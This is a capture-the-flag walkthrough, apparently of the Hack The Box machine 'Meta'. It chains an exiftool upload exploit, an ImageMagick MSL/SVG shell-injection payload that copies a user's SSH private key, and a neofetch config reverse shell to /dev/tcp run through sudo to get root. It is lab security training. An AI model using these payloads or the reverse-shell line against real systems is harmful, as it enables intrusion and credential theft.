## Nmap
```
└─$ nmap -sC -sV 10.10.11.140
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-01 04:50 EDT
Nmap scan report for artcorp.htb (10.10.11.140)
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.04 seconds
```

Port `80` is opened , let's check 

![WebPage](https://user-images.githubusercontent.com/8396956/166138534-ef70f047-2d20-4769-aaee-8096e8d56be8.png)

adding `artcorp.htb` into `/etc/hosts`
then i tried to scan the webpages but got nothing 

## Fuzzing
```
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --sc 200 -H "HOST:FUZZ.artcorp.htb" http://artcorp.htb/                                                                                      148 ⨯ 1 ⚙
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://artcorp.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000001492:   200        9 L      24 W       247 Ch      "dev01 - dev01"  

```

Adding `dev01.artcorp.htb` into /etc/hosts

![dev1](https://user-images.githubusercontent.com/8396956/166138808-15d7987a-29ed-401a-89ee-1e80a1627981.png)

Go to  `MetaView`

![dev2](https://user-images.githubusercontent.com/8396956/166138812-61c7a303-e142-4c10-8cb7-a6d7ac18b97a.png)

Upload any image as a test

![uploadTest](https://user-images.githubusercontent.com/8396956/166138961-df1aac49-54e3-456c-b254-1e2bd0745a67.png)

trying to exploit this upload function , found that the result looks like the `exiftool` result 

![exiftool](https://user-images.githubusercontent.com/8396956/166139055-f492b990-65eb-45fa-b6c1-66f6c2fd671d.png)

after searching for exploit to `exiftool` found [Exiftool Exploitation](https://github.com/convisolabs/CVE-2021-22204-exiftool)

Don't forget to change  `IP & PORT` then run `exploit.py`

![pythonEXP](https://user-images.githubusercontent.com/8396956/166139282-119b8615-310b-479b-aaf9-4ef806ff6b53.png)

upload `image.jpg` and listen to port 

## Foothold
![wwwdata](https://user-images.githubusercontent.com/8396956/166139405-00d45680-d630-4933-a329-d895aeab2a88.png)

## Privilege escalation

After Enumeration and using tools got a good result with `pspy64`

First download it on the victim machine

![openpython](https://user-images.githubusercontent.com/8396956/166139724-61d52778-8a90-4f8b-af72-ea8e9ab2a5cf.png)
![psupload](https://user-images.githubusercontent.com/8396956/166139729-1f121464-c7cb-49ab-bd78-dfe8a73712c8.png)

Run `pspy64` we will find a script

```
2022/05/01 05:18:01 CMD: UID=1000 PID=1437   | /bin/bash /usr/local/bin/convert_images.sh 
2022/05/01 05:18:01 CMD: UID=0    PID=1436   | /usr/sbin/CRON -f 
2022/05/01 05:18:01 CMD: UID=1000 PID=1435   | /bin/bash /usr/local/bin/convert_images.sh 
2022/05/01 05:18:01 CMD: UID=1000 PID=1433   | /bin/sh -c /usr/local/bin/convert_images.sh 
```

here is the content of `convert_images.sh`

```
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

this uses `mogrify` to change all files into png , `The mogrify program is a member of the ImageMagick suite of tools`

```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ /usr/local/bin/mogrify -version
<tcorp.htb/metaview$ /usr/local/bin/mogrify -version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```
searching for exploitation to this version and found [Exploitation](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)
Create `poc.svg`

```
<image authenticate='ff" `echo $(id)> /dev/shm/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```


move it into `/var/www/dev01.artcorp.htb/convert_images/`

check `/dev/shm/` 
```
www-data@meta:/tmp$ cd /dev/shm
cd /dev/shm
www-data@meta:/dev/shm$ ls -la
ls -la
total 4
drwxrwxrwt  2 root   root     60 May  1 06:31 .
drwxr-xr-x 16 root   root   3080 May  1 04:31 ..
-rw-r--r--  1 thomas thomas   54 May  1 06:29 0wned
www-data@meta:/dev/shm$ cat 0wned
cat 0wned
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)

```
we execute commands as `thomas` let's get ssh to connect by changing first line to 

``` <image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'> ```

```
www-data@meta:/dev/shm$ ls -la
ls -la
total 8
drwxrwxrwt  2 root   root     80 May  1 06:41 .
drwxr-xr-x 16 root   root   3080 May  1 04:31 ..
-rw-r--r--  1 thomas thomas   54 May  1 06:29 0wned
-rw-r--r--  1 thomas thomas 2590 May  1 06:41 id_rsa
```
We got ssh of user `thomas` ,  download it into attacker machine 
```
www-data@meta:/dev/shm$ python3 -m http.server 8005
python3 -m http.server 8005
Serving HTTP on 0.0.0.0 port 8005 (http://0.0.0.0:8005/) ...
10.10.14.4 - - [01/May/2022 06:42:26] "GET /id_rsa HTTP/1.1" 200 -
```
then give it right permissions `chmod 600 id_rsa` and connect using the key ^_^

![thomas](https://user-images.githubusercontent.com/8396956/166142546-6f15b3e9-9ef6-424b-baf9-d16a331ff417.png)

## Root

```
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

searching for `neofetch` exploitation , found [neofetch](https://gtfobins.github.io/gtfobins/neofetch/)

but the problem we must enter specific parameters

let's edit the config file 
```
thomas@meta:~$ cd ~/.config/neofetch/
thomas@meta:~/.config/neofetch$ ls -la
total 24
drwxr-xr-x 2 thomas thomas  4096 Dec 20 08:33 .
drwxr-xr-x 3 thomas thomas  4096 Aug 30  2021 ..
-rw-r--r-- 1 thomas thomas 14591 Aug 30  2021 config.conf
thomas@meta:~/.config/neofetch$ 
```
edit it with `nano config.conf` and add reverse shell ```/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"```
```
thomas@meta:~/.config/neofetch$ nano config.conf
thomas@meta:~/.config/neofetch$ export XDG_CONFIG_HOME="$HOME/.config"
thomas@meta:~/.config/neofetch$ nano config.conf
thomas@meta:~/.config/neofetch$ sudo /usr/bin/neofetch \"\"
```
```
┌──(mido㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from artcorp.htb [10.10.11.140] 46732
root@meta:/home/thomas/.config/neofetch# 
```

## Rooted 




